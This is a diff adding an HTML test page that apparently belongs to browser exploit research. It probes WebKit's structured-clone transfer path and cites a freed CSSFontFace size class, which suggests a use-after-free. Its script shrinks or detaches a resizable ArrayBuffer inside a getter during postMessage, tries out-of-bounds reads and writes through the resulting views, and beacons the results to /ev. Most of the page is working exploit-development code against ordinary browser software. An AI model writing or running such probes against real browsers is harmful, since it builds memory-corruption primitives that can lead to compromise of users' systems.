@@ -1,0 +1,167 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>caps8 — the transfer-list walk on this build: does the serializer run before the transfer, and what does a mid-walk resize produce</title>
+<body><p id="p">caps8</p>
+<script>
+// GOAL.md item 1 (docs/89).  docs/67 closed the BroadcastChannel spelling because that IDL has no
+// transfer argument, so `m_arrayBufferContentsArray` was never reached.  `Worker.idl:35` and
+// `dom/MessagePort.idl:35` both declare `postMessage(any message, sequence<object> transfer)`.
+//
+// Tests, one beacon each, one variable apart:
+//   A plain 192-byte buffer      — does it arrive, and does the sender lose it?
+//   B resizable, no shrink       — the control for C
+//   C resizable + resize(0) in the getter AFTER the view was dumped — the mismatch
+//   D detach in the getter       — the other way to make the payload and the contents disagree
+//   E resize(0) BEFORE the view is dumped — the ordering control for C
+//   G DataView instead of a Uint8Array, shrink — a fixed-length view, not the auto-length kind
+//   H G without the shrink       — the control for G
+//   I the buffer twice in the transfer list — the duplicate-index route
+//   F C through a Worker         — the spelling GOAL.md names
+//
+// Source prediction: `CloneSerializer::serialize()` is called at SerializedScriptValue.cpp:5463 and
+// `transferArrayBuffers()` at :5477, so the whole walk (getters included) runs BEFORE the detach —
+// the getter should read the full length in every mode.  `readArrayBufferViewImpl` (:3279) does no
+// range check, and `wrappedAs` skips `verifySubRangeLength` when the buffer is resizable, "since it
+// will be just recognized as OOB TypedArray".
+(function () {
+  'use strict';
+  function B(m, x) { try { (new Image()).src = '/ev?m=' + encodeURIComponent(String(m)) + (x ? '&' + x : ''); } catch (e) {} }
+
+  var LEN = 192;                       // the freed CSSFontFace's size class (docs/65)
+  var wrk = null, stage = 0, token = 0;
+
+  B('cap', 'resize=' + (typeof ArrayBuffer.prototype.resize) +
+    '&transfer=' + (typeof ArrayBuffer.prototype.transfer) +
+    '&resizable=' + (function () { try { return new ArrayBuffer(8, { maxByteLength: 16 }).resizable; } catch (e) { return 'E:' + e.name; } })() +
+    '&mc=' + (typeof MessageChannel) + '&wk=' + (typeof Worker) + '&sc=' + (typeof structuredClone) +
+    '&portxfer=' + (function () { try { var c = new MessageChannel(); var b = new ArrayBuffer(8); c.port1.postMessage(1, [b]); return b.byteLength; } catch (e) { return 'E:' + e.name; } })());
+
+  function rd1(v, i) {
+    if (typeof v.getUint8 === 'function' && v.length === undefined) return String(v.getUint8(i));
+    return String(v[i]);
+  }
+  function wr1(v, i, x) {
+    if (typeof v.setUint8 === 'function' && v.length === undefined) { v.setUint8(i, x); return; }
+    v[i] = x;
+  }
+
+  function mkWorker(cb) {
+    var src = 'onmessage=function(e){var r={n:e.data&&e.data.n};' +
+      'try{var v=e.data&&e.data.v;if(v){r.vl=v.length;r.vb=v.byteLength;r.bb=v.buffer.byteLength;' +
+      'r.mx=(v.buffer.maxByteLength===undefined?-1:v.buffer.maxByteLength);' +
+      'r.rd=String(v[64]);try{v[64]=65;r.wr=1;}catch(x){r.wr="E:"+x.name;}r.rd2=String(v[64]);}}catch(x){r.err=x.name;}' +
+      'try{postMessage(r);}catch(x){}};';
+    try { wrk = new Worker(URL.createObjectURL(new Blob([src], { type: 'text/javascript' }))); }
+    catch (e) { wrk = null; B('wkfail', 'e=' + e.name); return; }
+    wrk.onmessage = function (e) { cb(e.data); };
+    wrk.onerror = function (e) { B('wkerr', 'm=' + encodeURIComponent(String(e && e.message))); };
+  }
+
+  var TESTS = [
+    ['A', 'plain'], ['B', 'res'], ['C', 'shrink'], ['D', 'detach'], ['E', 'shrinkrev'],
+    ['G', 'dvshrink'], ['H', 'dv'], ['I', 'dup']
+  ];
+
+  function next() { var t = ++token; setTimeout(function () { if (t === token) step(t); }, 20); }
+  function step(t) {
+    if (t !== token) return;
+    if (stage >= TESTS.length) { testWorker('F', 'shrink'); return; }
+    var e = TESTS[stage++];
+    testPort(e[0], e[1]);
+  }
+
+  // mode: plain | res | shrink | shrinkrev | detach | dvshrink | dv | dup
+  function testPort(tag, mode) {
+    var dv = (mode === 'dv' || mode === 'dvshrink');
+    var shrink = (mode === 'shrink' || mode === 'shrinkrev' || mode === 'dvshrink');
+    var resizable = (mode !== 'plain' && mode !== 'dup');
+    var buf;
+    try { buf = resizable ? new ArrayBuffer(LEN, { maxByteLength: LEN }) : new ArrayBuffer(LEN); }
+    catch (e) { B('wx' + tag, 'mkerr=' + e.name + '&mode=' + mode); return next(); }
+    var view;
+    try { view = dv ? new DataView(buf, 0, LEN) : new Uint8Array(buf); }
+    catch (e) { B('wx' + tag, 'vwerr=' + e.name + '&mode=' + mode); return next(); }
+
+    var gx = -1, gx2 = -1, ger = '', tx = -1, txe = '', gn = 0;
+    function getter() {
+      gn++;
+      gx = buf.byteLength;
+      try {
+        if (shrink) { buf.resize(0); gx2 = buf.byteLength; }
+        if (mode === 'detach') { structuredClone(buf, { transfer: [buf] }); }
+      } catch (e) { ger = e.name; }
+      return 1;
+    }
+    // property order is the whole point: `v` first dumps the view (recording its byteLength and the
+    // buffer's transfer index), then `g` runs page script, then the walk ends and the transfer runs.
+    var msg = { c: 0 };
+    if (mode === 'shrinkrev') {
+      Object.defineProperty(msg, 'g', { enumerable: true, configurable: true, get: getter });
+      msg.v = view;
+    } else {
+      msg.v = view;
+      Object.defineProperty(msg, 'g', { enumerable: true, configurable: true, get: getter });
+    }
+
+    var ch = new MessageChannel();
+    var done = false;
+    ch.port2.onmessage = function (e) {
+      if (done) return; done = true;
+      var d = e.data, v = d && d.v;
+      var out = 'gx=' + gx + '&gx2=' + gx2 + '&gerr=' + (ger || '-') + '&gn=' + gn +
+        '&tx=' + tx + '&txe=' + (txe || '-') + '&rxv=' + (v ? 1 : 0) + '&cn=' + (d && d.c);
+      if (v) {
+        out += '&vl=' + v.length + '&vb=' + v.byteLength + '&bb=' + (v.buffer ? v.buffer.byteLength : -1) +
+          '&mx=' + (v.buffer && v.buffer.maxByteLength !== undefined ? v.buffer.maxByteLength : -1);
+        try { out += '&rd=' + rd1(v, 64); } catch (x) { out += '&rde=' + x.name; }
+        try { wr1(v, 64, 0x41); out += '&wr=1&rd2=' + rd1(v, 64); } catch (x) { out += '&wre=' + x.name; }
+      } else { out += '&dtype=' + (typeof d); }
+      B('wx' + tag, 'mode=' + mode + '&' + out);
+      try { ch.port1.close(); ch.port2.close(); } catch (x) {}
+      next();
+    };
+    var list = (mode === 'dup') ? [buf, buf] : [buf];
+    try { ch.port1.postMessage(msg, list); tx = buf.byteLength; }
+    catch (e) {
+      txe = e.name; tx = buf.byteLength;
+      B('wx' + tag, 'mode=' + mode + '&gx=' + gx + '&gx2=' + gx2 + '&gn=' + gn + '&tx=' + tx + '&txe=' + txe);
+      try { ch.port1.close(); ch.port2.close(); } catch (x) {}
+      return next();
+    }
+    setTimeout(function () {                      // fallback: a post that never arrives must not stall the chain
+      if (done) return; done = true;
+      B('wx' + tag, 'mode=' + mode + '&gx=' + gx + '&gx2=' + gx2 + '&gn=' + gn + '&gerr=' + (ger || '-') +
+        '&tx=' + tx + '&txe=' + (txe || '-') + '&norx=1');
+      next();
+    }, 400);
+  }
+
+  // F: the worker spelling, last (a worker costs a thread; one is enough).
+  function testWorker(tag, mode) {
+    mkWorker(function (d) {
+      B('wx' + tag, 'mode=' + mode + '&echo=1&n=' + d.n + '&vl=' + d.vl + '&vb=' + d.vb + '&bb=' + d.bb +
+        '&mx=' + d.mx + '&rd=' + d.rd + '&wr=' + d.wr + '&rd2=' + d.rd2 + '&err=' + (d.err || '-'));
+      B('done', 'mode=wx&n=' + (TESTS.length + 1));
+    });
+    if (!wrk) return;
+    var buf = new ArrayBuffer(LEN, { maxByteLength: LEN });
+    var u8 = new Uint8Array(buf);
+    var gx = -1, gx2 = -1, gn = 0;
+    var msg = { v: u8, c: 0 };
+    Object.defineProperty(msg, 'g', {
+      enumerable: true, configurable: true,
+      get: function () {
+        gn++; gx = buf.byteLength;
+        try { if (mode === 'shrink') { buf.resize(0); gx2 = buf.byteLength; } } catch (e) {}
+        return 1;
+      }
+    });
+    var tx = -1, txe = '';
+    try { wrk.postMessage(msg, [buf]); tx = buf.byteLength; } catch (e) { txe = e.name; tx = buf.byteLength; }
+    B('wx' + tag + 't', 'mode=' + mode + '&gx=' + gx + '&gx2=' + gx2 + '&gn=' + gn + '&tx=' + tx + '&txe=' + (txe || '-'));
+  }
+
+  setTimeout(function () { step(++token); }, 0);
+})();
+</script>
+</body>
